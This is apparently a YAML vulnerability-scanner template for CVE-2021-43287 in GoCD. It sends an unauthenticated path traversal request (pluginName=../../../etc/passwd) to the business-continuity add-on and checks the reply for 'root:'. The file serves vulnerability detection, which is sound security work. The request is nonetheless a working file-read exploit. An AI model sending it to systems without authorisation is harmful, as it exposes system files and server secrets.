name: GoCD_Unauthorized_Path_Traversal_CVE_2021_43287
transport: http
set: {}
detail:
  dock: body="GoCD"
  product: GoCD
  homepage: https://www.gocd.org/
  impact: An issue was discovered in ThoughtWorks GoCD before 21.3.0. The business
    continuity add-on, which is enabled by default, leaks all secrets known to the
    GoCD server to unauthenticated attackers.
  description: GoCD is a continuous delivery server.
rules:
  r1:
    method: GET
    path: /go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../etc/passwd
    follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(b'root:')
expression: r1()
